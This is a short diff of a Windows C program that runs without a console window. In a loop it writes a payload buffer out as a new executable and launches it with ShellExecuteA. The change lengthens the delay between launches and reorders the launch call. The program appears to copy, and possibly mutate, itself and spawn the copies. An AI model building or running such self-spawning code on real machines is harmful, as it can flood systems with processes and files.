@@ -4,13 +4,12 @@
 #pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 
 #include<stdio.h>
-//#include <iostream>
 #include<Windows.h>
 #include<sys\timeb.h> 
 
 int NextPayloadSize = 32768;
 #define NextNum 3
-#define GapTime 1024
+#define GapTime 4096
 
 int myEXESize = 0;
 int myStaticLength = 0;
@@ -77,10 +76,9 @@ int main(int argc, char** argv)
         fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
         fclose(fp);
         fp = NULL;
-        //CreateProcessA(nextEXEName, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
-        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
+        
         Sleep(GapTime);
-        //nextPayloadBuf[MuPos] = 0x90;
+        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
     }
 }
 
